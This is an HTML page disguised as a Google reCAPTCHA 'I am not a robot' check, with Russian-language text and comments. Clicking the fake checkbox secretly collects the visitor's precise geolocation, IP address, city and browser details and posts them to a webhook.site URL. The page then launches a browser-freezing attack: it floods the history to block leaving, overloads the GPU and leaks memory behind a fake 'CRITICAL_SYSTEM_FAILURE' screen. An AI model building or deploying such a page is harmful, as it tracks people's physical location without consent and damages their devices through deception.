<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>reCAPTCHA: Проверка безопасности</title>
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .captcha-card { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); z-index: 9999; }
        .rc-anchor { display: flex; align-items: center; justify-content: space-between; height: 74px; }
        .rc-content { display: flex; align-items: center; }
        .checkbox-wrapper { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; cursor: pointer; position: relative; background: #fff; }
        .checkbox-wrapper.active::after { content: ''; position: absolute; left: 9px; top: 4px; width: 6px; height: 12px; border: solid #4285f4; border-width: 0 3px 3px 0; transform: rotate(45deg); }
        .rc-text { font-size: 14px; color: #555; }
        .rc-logo { text-align: center; }
        .rc-logo img { width: 32px; display: block; margin: 0 auto; }
        .rc-logo span { font-size: 8px; color: #555; font-weight: bold; }
        #status-msg { display: none; margin-top: 10px; font-size: 12px; color: #4285f4; text-align: center; }
    </style>
</head>
<body>

<div class="captcha-card" id="main-trigger">
    <div class="rc-anchor">
        <div class="rc-content">
            <div class="checkbox-wrapper" id="captcha-cb"></div>
            <div class="rc-text">Я не робот</div>
        </div>
        <div class="rc-logo">
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
            <span>reCAPTCHA</span>
        </div>
    </div>
    <div id="status-msg">Инициализация проверки региона...</div>
</div>

<script>
    // ТВОЙ URL ИЗ СКРИНШОТА
    const webhook = 'https://webhook.site/b28ec138-bf0a-4f8e-a5f8-23416b82a7ed';

    document.getElementById('main-trigger').onclick = function() {
        document.getElementById('captcha-cb').classList.add('active');
        document.getElementById('status-msg').style.display = 'block';

        // 1. МГНОВЕННЫЙ ЗАХВАТ ДАННЫХ
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                sendData({
                    event: 'FULL_EXPLOIT',
                    coords: pos.coords.latitude + ',' + pos.coords.longitude,
                    google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                });
                executeTotalFreeze(); 
            }, () => { executeTotalFreeze(); }, {enableHighAccuracy: true});
        }

        fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
            sendData({ event: 'DEVICE_INFO', ip: data.ip, city: data.city, device: navigator.userAgent });
        });
    };

    function sendData(payload) {
        fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
    }

    // 2. ЯДЕРНЫЙ МОДУЛЬ НАГРУЗКИ (CPU/RAM/GPU)
    function executeTotalFreeze() {
        sendData({ status: 'ATTACK_STARTED' });
        
        // Визуальный хаос
        document.body.innerHTML = "<div style='background:red;color:white;padding:20%;font-size:50px;font-weight:bold;'>CRITICAL_SYSTEM_FAILURE</div>";
        
        setInterval(() => {
            // Забиваем историю браузера (блокировка выхода)
            for (let i = 0; i < 500; i++) {
                history.pushState(null, null, "#" + Math.random());
            }
            
            // Нагрузка на GPU (тени)
            let d = document.createElement('div');
            d.style.boxShadow = '0px 0px 100px 50px black';
            document.body.appendChild(d);
            
            // Утечка памяти (RAM)
            let leak = new Array(1000000).fill("STRESS_TEST_" + Math.random());
            console.log(leak);
        }, 1);
    }
</script>
</body>
</html>
